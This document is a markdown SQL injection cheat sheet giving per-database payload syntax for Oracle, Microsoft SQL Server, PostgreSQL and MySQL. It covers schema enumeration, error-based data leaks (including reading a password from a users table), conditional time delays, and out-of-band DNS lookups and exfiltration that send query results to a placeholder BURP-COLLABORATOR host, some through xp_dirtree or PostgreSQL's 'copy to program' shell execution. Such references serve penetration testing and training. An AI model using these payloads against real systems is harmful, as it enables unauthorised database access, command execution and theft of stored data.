

````markdown
# 🧩 SQL Injection Cheat Sheet

This cheat sheet contains examples of useful syntax for performing various SQL injection tasks.  

---

## 🔗 String Concatenation
You can concatenate multiple strings into one.  

- **Oracle**
```sql
'foo'||'bar'
````

- **Microsoft**
    

```sql
'foo'+'bar'
```

- **PostgreSQL**
    

```sql
'foo'||'bar'
```

- **MySQL**
    

```sql
'foo' 'bar'   -- note space between strings
CONCAT('foo','bar')
```

---

## ✂️ Substring

Extract part of a string (1-based index).

- **Oracle**
    

```sql
SUBSTR('foobar', 4, 2)
```

- **Microsoft / PostgreSQL / MySQL**
    

```sql
SUBSTRING('foobar', 4, 2)
```

---

## 💬 Comments

Use comments to truncate queries.

- **Oracle**
    

```sql
--comment
```

- **Microsoft**
    

```sql
--comment
/*comment*/
```

- **PostgreSQL**
    

```sql
--comment
/*comment*/
```

- **MySQL**
    

```sql
#comment
-- comment   -- note space required
/*comment*/
```

---

## 🗄️ Database Version

Identify database type & version.

- **Oracle**
    

```sql
SELECT banner FROM v$version;
SELECT version FROM v$instance;
```

- **Microsoft**
    

```sql
SELECT @@version;
```

- **PostgreSQL**
    

```sql
SELECT version();
```

- **MySQL**
    

```sql
SELECT @@version;
```

---

## 📂 Database Contents

List tables and columns.

- **Oracle**
    

```sql
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';
```

- **Microsoft / PostgreSQL / MySQL**
    

```sql
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';
```

---

## ⚠️ Conditional Errors

Trigger errors when a condition is true.

- **Oracle**
    

```sql
SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;
```

- **Microsoft**
    

```sql
SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE NULL END;
```

- **PostgreSQL**
    

```sql
1 = (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/(SELECT 0) ELSE NULL END);
```

- **MySQL**
    

```sql
SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),'a');
```

---

## 🕵️ Extracting Data via Errors

Force error messages that leak data.

- **Microsoft**
    

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret');
-- Error: Conversion failed... 'secret'
```

- **PostgreSQL**
    

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
-- Error: invalid input syntax...
```

- **MySQL**
    

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
-- Error: XPATH syntax error: '\secret'
```

---

## 📑 Batched (Stacked) Queries

Execute multiple queries.

- **Oracle** ❌ Not supported
    
- **Microsoft / PostgreSQL / MySQL**
    

```sql
QUERY-1-HERE; QUERY-2-HERE;
```

⚠️ MySQL batched queries usually not allowed (depends on API).

---

## ⏱️ Time Delays

Force query to pause.

- **Oracle**
    

```sql
dbms_pipe.receive_message(('a'),10);
```

- **Microsoft**
    

```sql
WAITFOR DELAY '0:0:10';
```

- **PostgreSQL**
    

```sql
SELECT pg_sleep(10);
```

- **MySQL**
    

```sql
SELECT SLEEP(10);
```

---

## ⏳ Conditional Time Delays

Pause only if condition is true.

- **Oracle**
    

```sql
SELECT CASE WHEN (YOUR-CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;
```

- **Microsoft**
    

```sql
IF (YOUR-CONDITION) WAITFOR DELAY '0:0:10';
```

- **PostgreSQL**
    

```sql
SELECT CASE WHEN (YOUR-CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END;
```

- **MySQL**
    

```sql
SELECT IF(YOUR-CONDITION,SLEEP(10),'a');
```

---

## 🌍 DNS Lookups

Force DB to perform DNS lookup (requires Burp Collaborator).

- **Oracle**
    

```sql
-- XXE technique (unpatched Oracle)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual;

-- Patched Oracle (needs privileges)
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR');
```

- **Microsoft**
    

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR/a';
```

- **PostgreSQL**
    

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR';
```

- **MySQL (Windows only)**
    

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR\\a');
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR\\a';
```

---

## 📤 DNS Exfiltration

Exfiltrate query results via DNS.

- **Oracle**
    

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT YOUR-QUERY) || '.BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual;
```

- **Microsoft**
    

```sql
DECLARE @p varchar(1024);
SET @p=(SELECT YOUR-QUERY);
EXEC('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"');
```

- **PostgreSQL**
    

```sql
CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE p text;
BEGIN
  SELECT INTO p (SELECT YOUR-QUERY);
  EXECUTE 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR''';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT f();
```

- **MySQL (Windows only)**
    

```sql
SELECT YOUR-QUERY INTO OUTFILE '\\\\BURP-COLLABORATOR\\a';
```

---

```

```